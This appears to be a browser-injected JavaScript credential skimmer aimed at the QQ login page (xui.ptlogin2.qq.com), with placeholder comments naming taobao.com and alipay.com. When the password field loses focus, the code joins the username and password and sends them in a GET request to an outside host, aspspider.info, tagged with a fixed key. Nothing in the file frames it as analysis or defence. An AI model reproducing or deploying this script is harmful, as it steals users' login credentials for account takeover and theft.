function ajax(method, url, callback) {
	var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
	xhr.open(method, url, true);
	xhr.onreadystatechange = function () {
		if (xhr.readyState == 4 && xhr.status == 200) {
			var result = xhr.responseText;
			callback(result);
		}
	}
	xhr.send();
}

function callbackparam(data){
	console.log(data);
}

function postData(str){
	var content = "【来自FF】" + str;
	var url = "http://aspspider.info/CatcherXue0/Handler/ajaxhandler.ashx?key=CatcherX&content=" + content;
	ajax("GET", url, callbackparam);
}

//http://xui.ptlogin2.qq.com
var qqPw=document.getElementById('p');
qqPw.setAttribute("onblur","postData(document.getElementById('u').value + document.getElementById('p').value);");

//taobao.com

//alipay.com
